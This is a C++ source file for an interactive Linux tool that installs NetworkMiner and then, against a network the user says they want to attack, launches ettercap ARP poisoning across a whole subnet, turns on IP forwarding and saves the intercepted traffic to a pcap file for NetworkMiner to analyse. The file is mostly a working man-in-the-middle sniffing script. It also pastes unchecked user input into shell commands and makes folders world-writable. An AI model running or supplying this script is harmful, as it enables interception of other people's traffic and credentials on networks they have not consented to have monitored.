#include <iostream>
#include <fstream>
#include <string>
#include <stdlib.h>

namespace Color {
    enum Code {
        FG_RED      = 31,
        FG_GREEN    = 32,
        FG_BLUE     = 34,
        FG_DEFAULT  = 39,
        BG_RED      = 41,
        BG_GREEN    = 42,
        BG_BLUE     = 44,
        BG_DEFAULT  = 49
    };
    class Modifier {
        Code code;
    public:
        Modifier(Code pCode) : code(pCode) {}
        friend std::ostream&
        operator<<(std::ostream& os, const Modifier& mod) {
            return os << "\033[" << mod.code << "m";
        }
    };
}

int main(int argc, char **argv) {
start:


    Color::Modifier red(Color::FG_RED);
    Color::Modifier gre(Color::FG_GREEN);
    Color::Modifier def(Color::FG_DEFAULT);


    std::cout << red << "Do you need to install NetMiner? (press y/n)" << def << std::endl;
    char ans;
    std::cin.clear();
    fflush(stdin);
    std::cin.get(ans);
    if (ans == 'y')
    {
        system("clear");
        std::cout << red << "\n\nInstalling NetMiner" << def << std::endl;
        system("sudo apt-get install libmono-winforms2.0-cil");
        system("wget sf.net/projects/networkminer/files/latest -O /tmp/nm.zip");
        system("sudo unzip /tmp/nm.zip -d /opt/");
        system("cd /opt/NetworkMiner*");
        system("sudo chmod +x NetworkMiner.exe");
        system("sudo chmod -R go+w AssembledFiles/");
        system("sudo chmod -R go+w Captures/");

        std::cout << red << "\n\nAll have been Installed\n" << def << std::endl;
    } else if (ans != 'n' && ans != 'y'){
        std::cout << red <<"Error, wrong input please try again.\n" << def;
        goto start;
    }

    system("clear");
    std::cout << gre << "Please Connect to the network you want to attack and type-in your network addapter form the list bellow:\n" << def << std::endl;;
    system("ifconfig");
    std::string adapter;
    std::cin >>adapter;
    std::cout << "Please enter the network subMask (usually looks like 10.0.0 or 192.0.0) in form of X.X.X" << std::endl;
    std::string subMask;
    std::cin >> subMask;

    system("clear");
    std::string out;
    std::cout << "Please select output file name" << std::endl;
    std::cin >> out;

    std::string act = "sudo ettercap -T -M arp -i " + adapter + " -p /" + subMask + ".1-255/ -w " + out + ".pcap";
    act = "gnome-terminal -x sh -c \"" + act +"; bash\"";

    system(act.c_str());
    system("gnome-terminal -x sh -c \"mono /opt/NetworkMiner*/NetworkMiner.exe; bash\"");
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");

    std::cout << "When you wnat to stop the sniffing please press q on the new window." <<std::endl;
//To terminate the process please enter \'z\' in this window." << std::endl;;

    char s;
tryagain:
    std::cin.get(s);
    if (true){
        goto tryagain;
    }

}
